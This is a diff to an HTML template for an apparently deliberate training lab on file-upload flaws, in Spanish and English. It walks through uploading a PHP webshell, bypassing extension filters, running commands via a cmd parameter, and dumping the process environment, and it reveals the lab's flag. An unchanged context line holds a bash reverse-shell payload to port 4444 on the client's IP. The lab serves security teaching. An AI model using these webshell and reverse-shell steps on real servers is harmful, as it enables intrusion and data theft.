@@ -5,6 +5,17 @@
   {% include '_lab_header.html' %}
 
   <div class="hl-card mb-4">
+    <h3 class="text-xs font-semibold uppercase tracking-wider mb-2" style="color:var(--hl-primary)" data-i18n="upload_obj_title">Objetivo</h3>
+    <p class="text-sm text-gray-600 dark:text-gray-400 mb-3" data-i18n="upload_obj_desc">El formulario guarda los archivos en /uploads/ y el servidor ejecuta como PHP cualquier archivo con extensión .php. Sube una webshell, consigue ejecución remota de comandos (RCE) y recupera la flag.</p>
+    <ol class="text-sm text-gray-600 dark:text-gray-400 ml-4 list-decimal space-y-1">
+      <li data-i18n="upload_obj_1">Sube una webshell PHP (según la dificultad, evade el filtro de extensión / MIME).</li>
+      <li data-i18n="upload_obj_2">Accede a ella en /uploads/&lt;archivo&gt;?cmd=id para confirmar el RCE.</li>
+      <li data-i18n="upload_obj_3">Vuelca el entorno del proceso para leer la flag: ?cmd=env o ?cmd=printenv+HL_FLAG.</li>
+    </ol>
+    <p class="text-xs text-gray-400 mt-3"><i class="ph ph-flag text-green-500"></i> <strong class="text-green-500" data-i18n="upload_obj_flag_lbl">Flag:</strong> <code>HL{file_upload_webshell_executed}</code> <span data-i18n="upload_obj_flag_hint">— valídala en la barra lateral.</span></p>
+  </div>
+
+  <div class="hl-card mb-4">
     <form id="upload-form" method="POST" action="/upload" enctype="multipart/form-data">
       <label id="drop-zone" for="file-input"
              style="display:block;border:2px dashed rgba(var(--hl-primary-rgb),.25);border-radius:.75rem;padding:2.5rem 1.5rem;text-align:center;cursor:pointer;transition:border-color .2s,background .2s">
@@ -177,6 +188,13 @@ cp shell.php shell.php.jpg</pre>
       </li>
     </ol>
 
+    <h3>Capturar la flag</h3>
+    <p>La flag del lab vive en el entorno del proceso PHP y solo es accesible cuando tu webshell se ejecuta de verdad. Vuélcalo con el parámetro <code>cmd</code>:</p>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
+# o directamente
+curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
+    <p>Flag: <code>HL{file_upload_webshell_executed}</code>. Valídala en la barra lateral.</p>
+
     <h3>Herramientas</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
   </div>
@@ -246,6 +264,13 @@ cp shell.php shell.php.jpg</pre>
         <pre>curl "http://localhost:5000/uploads/shell.php.jpg?cmd=bash+-c+'bash+-i+>%26+/dev/tcp/{{ client_ip }}/4444+0>%261'"</pre>
       </li>
     </ol>
+
+    <h3>Capture the flag</h3>
+    <p>The lab flag lives in the PHP process environment and is only reachable once your webshell actually executes. Dump it through the <code>cmd</code> parameter:</p>
+    <pre>curl "http://localhost:5000/uploads/shell.php?cmd=env" | grep HL_FLAG
+# or directly
+curl "http://localhost:5000/uploads/shell.php?cmd=printenv+HL_FLAG"</pre>
+    <p>Flag: <code>HL{file_upload_webshell_executed}</code>. Validate it in the sidebar.</p>
 
     <h3>Tools</h3>
     <div><span class="tools-badge">curl</span> <span class="tools-badge">nc</span> <span class="tools-badge">weevely</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">msfvenom</span></div>
